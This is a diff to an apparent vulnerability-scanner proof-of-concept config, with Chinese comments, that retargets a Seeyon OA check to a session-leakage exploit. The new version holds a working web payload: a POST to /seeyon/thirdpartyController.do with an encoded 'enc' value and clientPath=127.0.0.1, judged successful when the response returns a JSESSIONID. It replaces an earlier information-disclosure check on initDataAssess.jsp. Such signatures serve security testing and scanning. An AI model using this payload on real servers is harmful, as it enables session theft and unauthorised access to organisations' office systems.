@@ -1,23 +1,23 @@
 #poc名称
 - name:
-  - name: "SeeyouOA_A6_initDataAssess_Disclosure_of_sensitive_user_information"
+  - name: "SeeyouOA_Session_Leakage"
 
 #请求方式
 - method:
-  - method: "get"
+  - method: "post"
 
 #payload
 - payload:
-  - payload: "isNone"
+  - payload: 'method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1'
 
 #response包里的关键字
 - word:
   - word:
-      - "personList"
+      - "JSESSIONID"
 
 #漏洞的位置
 - url:
-  - url : "/yyoa/assess/js/initDataAssess.jsp"
+  - url : "/seeyon/thirdpartyController.do"
 
 #验证是否攻击成功的 请求方式
 - method-V:
